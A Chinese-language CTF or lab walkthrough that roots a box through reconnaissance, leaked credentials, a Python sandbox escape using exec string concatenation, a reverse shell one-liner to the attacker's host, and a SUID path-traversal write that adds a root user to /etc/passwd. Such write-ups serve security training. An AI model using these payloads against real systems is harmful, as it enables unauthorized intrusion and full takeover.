#### 信息收集

1. 主机发现：nmap -sn -PE -n 192.168.2.0/24
   192.168.2.7是新增加的IP地址
2. 端口扫描：nmap -sT -T4 -p- 192.168.2.7

   PORT   STATE SERVICE
   22/tcp open  ssh
   80/tcp open  http
3. 详细服务以及操作系统信息：nmap -sT -sV -T4 -O -p22,80 192.168.2.7
   PORT   STATE SERVICE VERSION
   22/tcp open  ssh     OpenSSH 8.5 (protocol 2.0)
   80/tcp open  http    Apache httpd 2.4.46 ((Unix) mod_wsgi/4.7.1 Python/3.9)

   OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
   OS details: Linux 4.15 - 5.6
4. 打开dirsearch目录扫描，同时查看80端口

#### Web渗透

1. 页面是一个python在线运行服务，推测有可能是命令执行漏洞
2. dirsearch扫描结束，得到robots.txt，login文件，访问robots.txt文件，
   Disallow: /register
   Disallow: /login
   Disallow: /zbir7mn240soxhicso2z
3. 访问zbir7mn240soxhicso2z：
   Username: steve
   Password: bvbkukHAeVxtjjVH
4. 用拿到的账户密码登录：Welcome back，Steve！
   进入python在线IDE
5. 看到这样一句话：This online IDE is protected with NoImportOS™, an unescapable™ sandbox. NoImportOS™ is secure because of its simplicity; it's only 9 lines of code ([available here](http://192.168.2.7/noimportos_sandbox.py)).This way attackers won't be able to **exec**ute anything malicious
   点击[available here](http://192.168.2.7/noimportos_sandbox.py)，查看过滤代码，import，os都被过滤，但明显有一个exec提示，利用字符串相加来绕过，payload：

   exec('impor'+'t o'+'s')
   exec('o'+'s'+'.system("/bin/bash")')

   拿到网站权限
6. 再反弹一个shell到kali上提高交互性：
   kali开启nc：nc -nlvp 4444

   ```
   python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.6",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
   ```

#### 权限提升

1. suid提权，查询具有suid的命令：find / -perm -u=s -type f 2>/dev/null
   typing命令可执行，查看typing.cc

   ```c++
   int main() {
       std::cout << "Let's play a game! If you can type the sentence below, then I'll tell you my password.\n\n";

       std::string text = "the quick brown fox jumps over the lazy dog";


       std::cout << text << '\n';

       std::string line;
       std::getline(std::cin, line);

       if (line == text) {
           std::ifstream password_file("/home/py/password.txt");
           std::istreambuf_iterator<char> buf_it(password_file), buf_end;
           std::ostreambuf_iterator<char> out_it(std::cout);
           std::copy(buf_it, buf_end, out_it);
       }
       else {
           std::cout << "WRONG!!!\n";
       }
   }
   ```

   只要输入等同于text的内容就能得到密码，运行typing，输入"the quick brown fox jumps over the lazy dog",得到密码：

   54ezhCGaJV
2. cat etc/passwd:py:x:1000:1000::/home/py:/bin/bash，得到的密码是显然是py用户的
   su py切换用户，呼啊咪是py，得到普通用户权限
3. 刚刚不能看的secret_stuff可以查看了，有backup命令和backup.cc文件，bakeup命令有suid去权限，查看backup.cc

   ```c++
   int main() {
       std::cout << "Enter a line of text to back up: ";
       std::string line;
       std::getline(std::cin, line);
       std::string path;
       std::cout << "Enter a file to append the text to (must be inside the /srv/backups directory): ";
       std::getline(std::cin, path);
   //  /srv/backups/../../etc/passwd
       if (!path.starts_with("/srv/backups/")) {
           std::cout << "The file must be inside the /srv/backups directory!\n";
       }
       else {
           std::ofstream backup_file(path, std::ios_base::app);
           backup_file << line << '\n';
       }
       return 0;
   }
   ```

   backup命令的作用是追加字符串到文件的末尾，利用判断是否以/srv/backups/限制用户的行为，我们可以用../达到读写任意文件的目的
4. 通过修改/etc/passwd文件增加root权限用户：

   ```
   passwd文件结构：
   py:x:1000:1000::/home/py:/bin/bash
   username:Encrypted password:UID:GID:Gecos Field:Home Directory:Shell
   username：登录用户的名称
   Encrypted password：x表示加密密码，实际存储在/shadow文件中。如果用户没有密码，则密码字段将用*（星号）表示
   User Id (UID)：必须为每个用户分配一个用户ID（UID）。Uid 0（零）为root用户保留，UID 1-99为进一步的预定义帐户保留，UID 100-999为管理目的由系统保留。UID 1000几乎是第一个非系统用户，通常是管理员。如果我们在Ubuntu系统上创建一个新用户，它将被赋予UID 1001
   Group Id (GID)：表示每个用户的组；与UID一样，前100个GID通常保留以供系统使用。GID为0与root组相关，GID为1000通常表示用户。新组通常分配GID从1000开始
   Gecos Field：通常，这是一组以逗号分隔的值，用于说明与用户相关的更多详细信息
   Home Directory：表示用户主目录的路径，其中存储用户的所有文件和程序。如果没有指定的目录，则/将成为用户的目录
   Shell：它表示（由用户）执行命令并显示结果的默认shell的完整路径
   ```

   ```
   openssl passwd用法：
   openssl passwd -1 -salt username password
   -l:MD5加密
   -salt:指定salt值，不使用随机产生的salt
   ```

   执行命令：openssl passwd -1 -salt hacker 123456

   得到：`$1$hacker$6luIRwdGpBvXdP.GMwcZp/`
5. 构造要添加的内容：

   `hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0::/root:/bin/bash`
6. 执行backup命令：

   ```
   Enter a line of text to back up:hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0::/root:/bin/bash
   Enter a file to append the text to (must be inside the /srv/backups directory): /srv/backups/../../etc/passwd
   ```
7. 切换hacker用户：su hacker，密码123456

提权成功：

```
[root@archlinux ~]# whoami
root
[root@archlinux ~]# cat root.txt 
63a9f0ea7bb98050796b649e85481845

```
